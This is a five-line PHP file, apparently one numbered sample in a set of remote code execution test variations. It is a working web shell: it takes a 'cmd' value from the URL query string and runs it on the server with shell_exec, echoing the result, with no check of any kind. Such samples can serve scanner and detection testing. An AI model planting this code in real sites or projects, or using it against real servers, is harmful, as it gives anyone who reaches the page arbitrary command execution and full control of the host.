<?php
// RCE test variation #882
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>